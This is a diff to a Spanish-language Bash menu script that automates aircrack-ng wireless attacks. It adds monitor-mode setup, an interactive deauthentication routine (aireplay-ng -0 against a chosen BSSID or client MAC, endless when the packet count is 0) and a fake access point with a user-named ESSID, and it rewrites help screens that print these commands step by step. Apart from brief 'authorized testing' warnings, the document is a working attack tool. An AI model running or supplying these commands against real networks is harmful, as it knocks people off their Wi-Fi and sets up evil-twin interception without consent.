@@ -35,7 +35,7 @@ select_adapter() {
     fi
     if ! iwconfig "$ADAPTER" >/dev/null 2>&1; then
         printf "\033[1;31mError: El adaptador '$ADAPTER' no existe o no está disponible.\033[0m\n"
-        printf "Ejecute 'airmon-ng' para ver interfaces disponibles.\n"
+        printf "Ejecute 'iwconfig' para verificar.\n"
         printf "\033[1;34m¿Desea seleccionar otro adaptador? (s/n): \033[0m"
         read -r retry
         if [[ "$retry" =~ ^[sS]$ ]]; then
@@ -46,6 +46,39 @@ select_adapter() {
     fi
     printf "\033[1;32mAdaptador seleccionado: $ADAPTER\033[0m\n"
     sleep 2
+}
+
+# Función para iniciar modo monitor o verificar si ya está activo
+start_monitor_mode() {
+    printf "\n\033[1;33mVerificando modo monitor en $ADAPTER...\033[0m\n"
+    if iwconfig "$ADAPTER" 2>/dev/null | grep -q "Mode:Monitor"; then
+        MONITOR_ADAPTER="$ADAPTER"
+        printf "\033[1;32mEl adaptador $ADAPTER ya está en modo monitor.\033[0m\n"
+    else
+        printf "\n\033[1;33mIniciando modo monitor en $ADAPTER...\033[0m\n"
+        airmon-ng check kill
+        AIRMON_OUTPUT=$(airmon-ng start "$ADAPTER" 2>&1)
+        if [ $? -ne 0 ]; then
+            printf "\033[1;31mError al ejecutar airmon-ng start. Salida:\n%s\033[0m\n" "$AIRMON_OUTPUT"
+            printf "\033[1;31mNo se pudo iniciar modo monitor en $ADAPTER.\033[0m\n"
+            printf "Sugerencias:\n"
+            printf "  - Ejecute 'airmon-ng start $ADAPTER' manualmente para diagnosticar.\n"
+            printf "  - Asegúrese de que el adaptador sea compatible con modo monitor.\n"
+            exit 1
+        fi
+        MONITOR_ADAPTER=$(echo "$AIRMON_OUTPUT" | grep -oP '(?<=monitor mode enabled on ).*?(?=\s|$)' | head -n 1)
+        if [ -z "$MONITOR_ADAPTER" ]; then
+            printf "\033[1;31mNo se pudo determinar el nombre del adaptador en modo monitor. Salida de airmon-ng:\n%s\033[0m\n" "$AIRMON_OUTPUT"
+            printf "\033[1;31mVerifique su adaptador y permisos.\033[0m\n"
+            exit 1
+        fi
+    fi
+    if ! iwconfig "$MONITOR_ADAPTER" >/dev/null 2>&1; then
+        printf "\033[1;31mError: El adaptador en modo monitor '$MONITOR_ADAPTER' no está disponible.\033[0m\n"
+        printf "Ejecute 'iwconfig' para verificar.\n"
+        exit 1
+    fi
+    printf "\033[1;32mModo monitor activo en: $MONITOR_ADAPTER\033[0m\n"
 }
 
 # Función para mostrar el menú principal
@@ -77,20 +110,36 @@ ask_user() {
     esac
 }
 
-# Función para configurar el ataque de desautenticación
+# Función para configurar y ejecutar el ataque de desautenticación
 configure_deauth() {
-    printf "\n\033[1;33m¿Qué tipo de ataque de desautenticación desea realizar?\033[0m\n"
-    printf "1. A todos los clientes de un AP (equipo entero)\n"
-    printf "2. A un cliente específico\n"
-    printf "Seleccione una opción (1/2): "
-    read -r deauth_type
+    printf "\n\033[1;33mIniciando escaneo de redes con airodump-ng. Presione Ctrl+C cuando haya seleccionado una red.\033[0m\n"
+    airodump-ng "$MONITOR_ADAPTER"
 
-    printf "\n\033[1;34mIngrese el BSSID del AP (ejemplo: 64:58:AD:38:B3:1E): \033[0m"
+    printf "\n\033[1;34mIngrese el BSSID del AP seleccionado (ejemplo: 64:58:AD:38:B3:1E): \033[0m"
     read -r bssid
     if ! [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
         printf "\033[1;31mBSSID inválido. Debe tener el formato XX:XX:XX:XX:XX:XX.\033[0m\n"
         return 1
     fi
+
+    printf "\n\033[1;34mIngrese el canal del AP (ejemplo: 11, ver columna CH en airodump-ng): \033[0m"
+    read -r channel
+    if ! [[ "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 14 ]; then
+        printf "\033[1;31mCanal inválido. Debe ser un número entre 1 y 14.\033[0m\n"
+        return 1
+    fi
+
+    printf "\n\033[1;33mConfigurando $MONITOR_ADAPTER al canal $channel...\033[0m\n"
+    if ! iwconfig "$MONITOR_ADAPTER" channel "$channel"; then
+        printf "\033[1;31mError al configurar el canal $channel en $MONITOR_ADAPTER.\033[0m\n"
+        return 1
+    fi
+
+    printf "\n\033[1;33m¿Qué tipo de ataque de desautenticación desea realizar?\033[0m\n"
+    printf "1. A todos los clientes del AP\n"
+    printf "2. A un cliente específico\n"
+    printf "Seleccione una opción (1/2): "
+    read -r deauth_type
 
     if [ "$deauth_type" -eq 2 ]; then
         printf "\n\033[1;34mIngrese la dirección MAC del cliente (ejemplo: 62:0E:1C:D1:1D:69): \033[0m"
@@ -101,10 +150,19 @@ configure_deauth() {
         fi
     fi
 
+    printf "\n\033[1;34mIngrese la cantidad de paquetes de desautenticación a enviar (0 para infinito): \033[0m"
+    read -r packets
+    if ! [[ "$packets" =~ ^[0-9]+$ ]]; then
+        printf "\033[1;31mCantidad inválida. Debe ser un número entero mayor o igual a 0.\033[0m\n"
+        return 1
+    fi
+
     if [ "$deauth_type" -eq 1 ]; then
-        aireplay-ng -0 0 -a "$bssid" "${ADAPTER}mon"
+        printf "\n\033[1;32mIniciando ataque de desautenticación a todos los clientes del AP $bssid...\033[0m\n"
+        aireplay-ng -0 "$packets" -a "$bssid" "$MONITOR_ADAPTER"
     elif [ "$deauth_type" -eq 2 ]; then
-        aireplay-ng -0 0 -a "$bssid" -c "$client_mac" "${ADAPTER}mon"
+        printf "\n\033[1;32mIniciando ataque de desautenticación al cliente $client_mac en el AP $bssid...\033[0m\n"
+        aireplay-ng -0 "$packets" -a "$bssid" -c "$client_mac" "$MONITOR_ADAPTER"
     else
         printf "\033[1;31mOpción no válida.\033[0m\n"
         return 1
@@ -117,17 +175,31 @@ execute_commands() {
     printf "\n\033[1;32mEjecutando comandos...\033[0m\n"
     case $choice in
         1)
-            if ! airmon-ng start "$ADAPTER"; then
-                printf "\033[1;31mError al iniciar modo monitor en $ADAPTER.\033[0m\n"
+            start_monitor_mode
+            if ! airodump-ng "$MONITOR_ADAPTER"; then
+                printf "\033[1;31mError al escanear con $MONITOR_ADAPTER.\033[0m\n"
                 return 1
             fi
-            airmon-ng check kill
-            if ! airodump-ng "${ADAPTER}mon"; then
-                printf "\033[1;31mError al escanear con ${ADAPTER}mon.\033[0m\n"
+            printf "\n\033[1;34mIngrese el nombre del Punto de Acceso Falso (ESSID, ejemplo: MiRedFalsa): \033[0m"
+            read -r essid
+            if [ -z "$essid" ]; then
+                printf "\033[1;31mEl ESSID no puede estar vacío.\033[0m\n"
                 return 1
             fi
-            if ! airbase-ng -e 'RedFalsa' -c 6 "${ADAPTER}mon"; then
-                printf "\033[1;31mError al crear Fake AP con ${ADAPTER}mon.\033[0m\n"
+            printf "\n\033[1;34mIngrese el canal del Punto de Acceso Falso (ejemplo: 6, entre 1 y 14): \033[0m"
+            read -r channel
+            if ! [[ "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 14 ]; then
+                printf "\033[1;31mCanal inválido. Debe ser un número entre 1 y 14.\033[0m\n"
+                return 1
+            fi
+            printf "\n\033[1;33mConfigurando $MONITOR_ADAPTER al canal $channel...\033[0m\n"
+            if ! iwconfig "$MONITOR_ADAPTER" channel "$channel"; then
+                printf "\033[1;31mError al configurar el canal $channel en $MONITOR_ADAPTER.\033[0m\n"
+                return 1
+            fi
+            printf "\n\033[1;32mCreando Punto de Acceso Falso con ESSID '$essid' en canal $channel...\033[0m\n"
+            if ! airbase-ng -e "$essid" -c "$channel" "$MONITOR_ADAPTER"; then
+                printf "\033[1;31mError al crear Fake AP con $MONITOR_ADAPTER.\033[0m\n"
                 return 1
             fi
             ;;
@@ -166,15 +238,7 @@ EOL
             fi
             ;;
         4)
-            if ! airmon-ng start "$ADAPTER"; then
-                printf "\033[1;31mError al iniciar modo monitor en $ADAPTER.\033[0m\n"
-                return 1
-            fi
-            airmon-ng check kill
-            if ! airodump-ng "${ADAPTER}mon"; then
-                printf "\033[1;31mError al escanear con ${ADAPTER}mon.\033[0m\n"
-                return 1
-            fi
+            start_monitor_mode
             configure_deauth
             ;;
         5)
@@ -267,13 +331,17 @@ explain_fake_ap() {
     printf "  📌 Comando: \033[1;32mairmon-ng check kill\033[0m\n"
     printf "  ➜ Cierra procesos en segundo plano que puedan interferir.\n"
 
-    printf "\n🔹 \033[1;33mPaso 3: Escanear redes cercanas\033[0m\n"
-    printf "  📌 Comando: \033[1;32mairodump-ng ${ADAPTER}mon\033[0m\n"
-    printf "  ➜ Muestra una lista de redes disponibles.\n"
+    printf "\n🔹 \033[1;33mPaso 3: Escanear redes cercanas (opcional)\033[0m\n"
+    printf "  📌 Comando: \033[1;32mairodump-ng [MONITOR_ADAPTER]\033[0m\n"
+    printf "  ➜ Muestra una lista de redes disponibles para elegir un canal adecuado.\n"
 
-    printf "\n🔹 \033[1;33mPaso 4: Crear el Fake AP\033[0m\n"
-    printf "  📌 Comando: \033[1;32mairbase-ng -e 'RedFalsa' -c 6 ${ADAPTER}mon\033[0m\n"
-    printf "  ➜ Genera un AP falso con el ESSID 'RedFalsa' en el canal 6.\n"
+    printf "\n🔹 \033[1;33mPaso 4: Configurar el canal del adaptador\033[0m\n"
+    printf "  📌 Comando: \033[1;32miwconfig [MONITOR_ADAPTER] channel [CANAL]\033[0m\n"
+    printf "  ➜ Ajusta el adaptador al canal elegido para el AP falso.\n"
+
+    printf "\n🔹 \033[1;33mPaso 5: Crear el Fake AP\033[0m\n"
+    printf "  📌 Comando: \033[1;32mairbase-ng -e [ESSID] -c [CANAL] [MONITOR_ADAPTER]\033[0m\n"
+    printf "  ➜ Genera un AP falso con el ESSID y canal especificados.\n"
 
     printf "\n⚠️ \033[1;31mAdvertencia:\033[0m Usar con responsabilidad y ética.\n"
     printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
@@ -380,17 +448,21 @@ explain_deauth() {
     printf "  📌 Comando: \033[1;32mairmon-ng check kill\033[0m\n"
     printf "  ➜ Elimina procesos que puedan interferir.\n"
 
-    printf "\n🔹 \033[1;33mPaso 3: Escanear redes\033[0m\n"
-    printf "  📌 Comando: \033[1;32mairodump-ng ${ADAPTER}mon\033[0m\n"
-    printf "  ➜ Captura paquetes y muestra redes cercanas. Use esta información para obtener el BSSID y, si aplica, la MAC del cliente.\n"
+    printf "\n🔹 \033[1;33mPaso 3: Escanear redes cercanas\033[0m\n"
+    printf "  📌 Comando: \033[1;32mairodump-ng [MONITOR_ADAPTER]\033[0m\n"
+    printf "  ➜ Muestra las redes disponibles. Anote el BSSID y el canal (columna CH) de la red objetivo, y si aplica, la MAC del cliente (columna STATION).\n"
 
-    printf "\n🔹 \033[1;33mPaso 4: Ataque de desautenticación a todos los clientes de un AP\033[0m\n"
-    printf "  📌 Comando: \033[1;32maireplay-ng -0 0 -a [BSSID] ${ADAPTER}mon\033[0m\n"
-    printf "  ➜ Envía paquetes de desautenticación a todos los clientes del AP identificado por [BSSID].\n"
+    printf "\n🔹 \033[1;33mPaso 4: Configurar el canal del adaptador\033[0m\n"
+    printf "  📌 Comando: \033[1;32miwconfig [MONITOR_ADAPTER] channel [CANAL]\033[0m\n"
+    printf "  ➜ Ajusta el adaptador al canal del AP objetivo.\n"
 
-    printf "\n🔹 \033[1;33mPaso 5: Ataque de desautenticación a un cliente específico\033[0m\n"
-    printf "  📌 Comando: \033[1;32maireplay-ng -0 0 -a [BSSID] -c [MAC_CLIENTE] ${ADAPTER}mon\033[0m\n"
-    printf "  ➜ Envía paquetes de desautenticación solo al cliente con [MAC_CLIENTE] conectado al AP [BSSID].\n"
+    printf "\n🔹 \033[1;33mPaso 5: Ataque de desautenticación a todos los clientes\033[0m\n"
+    printf "  📌 Comando: \033[1;32maireplay-ng -0 [PAQUETES] -a [BSSID] [MONITOR_ADAPTER]\033[0m\n"
+    printf "  ➜ Envía [PAQUETES] paquetes de desautenticación a todos los clientes del AP identificado por [BSSID]. Use 0 para infinito.\n"
+
+    printf "\n🔹 \033[1;33mPaso 6: Ataque de desautenticación a un cliente específico\033[0m\n"
+    printf "  📌 Comando: \033[1;32maireplay-ng -0 [PAQUETES] -a [BSSID] -c [MAC_CLIENTE] [MONITOR_ADAPTER]\033[0m\n"
+    printf "  ➜ Envía [PAQUETES] paquetes de desautenticación al cliente [MAC_CLIENTE] conectado al AP [BSSID].\n"
 
     printf "\n⚠️ \033[1;31mAdvertencia:\033[0m Solo para pruebas de seguridad autorizadas.\n"
     printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
